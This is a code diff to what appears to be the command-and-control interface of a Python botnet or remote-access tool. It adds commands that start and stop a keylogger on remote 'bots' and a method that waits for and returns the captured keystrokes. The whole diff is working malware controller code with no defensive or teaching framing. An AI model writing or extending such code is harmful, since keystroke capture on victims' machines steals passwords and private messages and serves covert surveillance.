@@ -84,7 +84,7 @@ class Interface(object):
   self.ftp = None 
   self.task = None
   self.sig = self.signature
-
+  
  def close(self):
   if self.ftp:
    self.ftp.close()
@@ -240,8 +240,31 @@ class Interface(object):
    bot = self.get_bot(bot_id)
    if bot:
     bot['shell'].send(code=cmd_id, args=args)
-    return 'Command sent successfully'
+    if cmd_id == 12:
+     if not bot['shell'].keylogging:
+      bot['shell'].keylogging = True
+     else:
+      return 'Keylogger is already active'
+    if cmd_id == 13:
+     if bot['shell'].keylogging:
+      bot['shell'].keylogging = False
+     else:
+      return 'Keylogger is already inactive'
+    if all([cmd_id == 14, not bot['shell'].keylogging]):
+     return 'Keylogger is inactive'
+    return self.keystrokes(bot['shell']) if cmd_id == 14 else 'Command sent successfully'
   return 'Failed to send command'
+
+ def keystrokes(self, bot_shell):
+  while all([bot_shell.is_alive, not bot_shell.keystrokes]):
+   pass 
+  try:
+   if all([bot_shell.is_alive, bot_shell.keystrokes]):
+    keystrokes = bot_shell.keystrokes
+    bot_shell.keystrokes = None
+    return keystrokes
+  except:
+   pass
 
  def start_task(self):
   Thread(target=self.task.start, args=[self.bots], daemon=True).start()
